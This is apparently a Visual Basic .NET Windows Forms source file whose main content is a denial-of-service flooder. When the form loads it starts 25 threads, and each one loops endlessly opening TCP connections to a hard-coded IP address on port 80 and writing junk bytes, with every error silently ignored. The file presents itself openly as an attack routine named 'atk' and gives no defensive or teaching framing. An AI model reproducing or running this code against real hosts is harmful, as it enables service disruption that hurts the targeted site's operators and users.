Imports System.Net
Imports System.Text
Imports System.Threading






Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Form3.Visible = True
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Form2.Visible = True
    End Sub
    Sub atk()

        For i = 1 To 10000000000
            Try
                Dim s As New Sockets.TcpClient("163.20.142.2", 80)
                Dim nws As Net.Sockets.NetworkStream = (s.GetStream())
                nws.Write(Encoding.ASCII.GetBytes("blablabla"), 0, Encoding.ASCII.GetByteCount("blablabla"))
            Catch ex As Exception

            End Try

            i = i - 1
        Next
    End Sub






    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim t(25) As Thread
        For i = 1 To 25
            t(i) = New Thread(AddressOf atk)
            t(i).Start()
        Next






    End Sub
End Class
